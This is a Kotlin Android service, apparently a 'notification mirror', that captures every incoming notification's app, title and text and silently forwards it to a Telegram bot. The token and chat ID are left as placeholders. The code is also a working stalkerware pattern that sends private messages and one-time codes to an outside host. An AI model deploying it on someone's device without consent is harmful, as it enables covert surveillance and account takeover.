package com.mirror.notifier

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class NotificationService : NotificationListenerService() {

    private val BOT_TOKEN = "SEM_DOSAD_TELEGRAM_BOT_TOKEN"
    private val CHAT_ID = "SEM_DOSAD_CHAT_ID"

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val n = sbn.notification
        val extras = n.extras

        val app = sbn.packageName
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val time = System.currentTimeMillis()

        val message = "APP: $app\nTIME: $time\nTITLE: $title\nTEXT: $text"

        sendTelegram(message)
    }

    private fun sendTelegram(text: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val encoded = URLEncoder.encode(text, "UTF-8")
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encoded")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.inputStream.close()
                conn.disconnect()
            } catch (_: Exception) {}
        }
    }
}
